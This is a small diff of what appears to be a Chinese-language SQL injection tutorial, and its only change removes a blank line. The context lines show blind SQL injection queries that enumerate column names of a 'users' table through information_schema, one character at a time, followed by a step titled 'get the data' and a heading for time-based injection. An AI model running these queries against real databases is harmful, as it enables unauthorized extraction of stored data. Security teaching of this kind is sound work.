@@ -92,5 +92,4 @@ SELECT length(column_name) from information_schema.columns where table_name='use
 select ord(SUBSTR((SELECT(COLUMN_NAME) from information_schema.columns where table_name='users' LIMIT 0,1),3,1))
 8. 获取数据
 
-
 ### 延时注入
